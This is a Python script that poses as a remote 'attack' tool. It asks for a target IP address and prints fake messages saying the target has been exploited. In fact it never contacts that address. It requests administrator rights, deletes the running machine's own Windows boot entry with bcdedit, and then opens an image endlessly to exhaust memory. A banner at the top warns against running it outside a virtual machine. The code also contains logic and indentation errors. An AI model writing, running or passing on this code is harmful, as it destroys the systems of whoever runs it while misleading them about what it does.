##############################################################################################################################################
##############################################################################################################################################
##############################################################################################################################################
##############################################################################################################################################
##############################################################################################################################################
########################################### DO NOT RUN FILE OUTSIDE A VIRTUAL MACHINE FOR YOUR OWN SAKE NOT MINE #############################
##############################################################################################################################################
##############################################################################################################################################
##############################################################YOU HAVE BEEN WARNED ###########################################################
##############################################################################################################################################
##############################################################################################################################################
import time
import os
import ctypes, sys
def is_usr_admin(): 
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def main(rhost):
    if len(rhost) <= 15:
        print(f"Target ip is {rhost} do you want to proceed? ")
        yesorno = input("Y/N: ")
        if yesorno == 'Y' or 'y':
            print("Attacking please wait... ")
            time.sleep(5)
            print("Target has been exploited you are now the owner of his machine ")
            time.sleep(1)
            destroy = input("Do you want to corrupt his system files? (Y or N): ")
            if destroy == 'Y' or 'y': #here is where the detruction starts
                if sys.platform.startswith("linux"):
                    #linux destrucion code here
                    print("os linux found")
                if sys.platform.startswith("win32"):
                    #windows destrucion starts here
                    os.system("bcdedit.exe /delete {current}") # This destroyes the bootloader for good
                    while True:
                        #opens a image forever until the machine runs out of ram
                        os.startfile('troll.jpg')
                 if sys.platform.startswith("darwin"):
                    pass
        else:
            print("Quitting ")
            quit
    else:
        print("Invalid Ip")
        quit


# main guard #
if __name__ == '__main__':
    if sys.platform.startswith("win32"):
        if is_usr_admin():
            main(input("SET TARGET IP: "))
        else:
            # asks for elevated perms
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        #this pervents the first if statment to trigger in a linux or mac enviroment
        main(input("SET TARGET IP: "))
